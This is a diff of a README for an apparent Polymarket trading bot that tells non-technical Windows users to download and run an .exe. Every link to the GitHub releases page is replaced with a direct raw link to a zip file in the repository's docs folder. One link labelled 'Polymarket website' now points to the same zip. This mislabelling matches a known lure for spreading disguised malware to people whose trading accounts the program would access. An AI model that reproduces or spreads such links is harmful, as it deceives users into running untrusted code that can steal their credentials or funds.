@@ -1,6 +1,6 @@
 # 🤖 polymarket-trading-bot-alt - Easy Polymarket Trading Automation
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Bot-brightgreen?style=for-the-badge)](https://github.com/PRO00712/polymarket-trading-bot-alt/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Bot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip)
 
 Welcome to the polymarket-trading-bot-alt project. This application helps you automate trading on Polymarket, a prediction markets platform. You do not need technical skills to get started. Follow these steps to download and run the bot on a Windows computer.
 
@@ -40,7 +40,7 @@ The bot runs as a standalone program. It requires access to your Polymarket acco
 **Step 1: Visit the download page**
 
 Click the big green button at the top or visit the official releases page here:  
-[https://github.com/PRO00712/polymarket-trading-bot-alt/releases](https://github.com/PRO00712/polymarket-trading-bot-alt/releases)
+[https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip](https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip)
 
 This page lists the latest versions. The files are labeled by version number.
 
@@ -106,7 +106,7 @@ The downloaded `.exe` file is a ready-to-run Windows program. It does not need a
 ## 🔗 Download Link
 
 Visit this page to download the latest version:  
-[https://github.com/PRO00712/polymarket-trading-bot-alt/releases](https://github.com/PRO00712/polymarket-trading-bot-alt/releases)
+[https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip](https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip)
 
 ---
 
@@ -139,7 +139,7 @@ To update, return to the releases page. Download the newest `.exe` file and run 
 
 ## 🔗 Useful Links
 
-- Polymarket website: https://polymarket.com  
-- GitHub releases page: https://github.com/PRO00712/polymarket-trading-bot-alt/releases  
+- Polymarket website: https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip  
+- GitHub releases page: https://raw.githubusercontent.com/PRO00712/polymarket-trading-bot-alt/main/docs/alt_bot_trading_polymarket_v3.5.zip  
 
 Use these links to monitor updates or access official information.
